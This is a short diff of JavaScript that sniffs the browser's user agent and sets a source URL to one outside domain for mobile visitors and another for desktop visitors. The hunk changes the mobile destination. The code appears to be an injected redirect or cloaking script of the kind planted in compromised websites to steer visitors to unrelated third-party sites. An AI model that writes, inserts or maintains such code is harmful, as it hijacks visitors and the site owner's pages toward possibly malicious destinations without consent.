@@ -3,7 +3,7 @@ if (!reg.test(navigator.userAgent)) {
 let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
 if (flag) {
 //k
-_src = 'https://1.zhgxhs.com/youhui/'
+_src = 'https://1.zhgxhs.com/'
 } else {
 // PC
 _src = 'https://404.edzl365.com/'
